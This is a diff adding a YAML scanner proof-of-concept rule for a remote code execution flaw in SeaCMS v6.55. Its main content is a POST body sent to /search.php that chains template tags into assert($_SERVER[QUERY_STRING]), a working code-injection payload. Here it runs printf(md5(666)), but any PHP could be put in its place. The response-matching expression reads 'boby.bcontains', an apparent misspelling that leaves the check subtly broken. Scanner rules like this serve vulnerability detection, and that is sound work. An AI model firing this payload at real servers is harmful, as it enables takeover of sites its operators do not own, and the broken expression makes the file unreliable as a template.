@@ -1,0 +1,11 @@
+name: poc-yaml-seacms-v655-rce
+rules:
+  - method: POST
+    path: /search.php?printf(md5(666))
+    body: >-
+      searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&ver=[QUERY_STRING]));/*
+    follow_redirects: true
+    expression: |
+      status==200&boby.bcontains(b'fae0b27c451c728867a567e8c1bb4e53')
+detail:
+  author:end
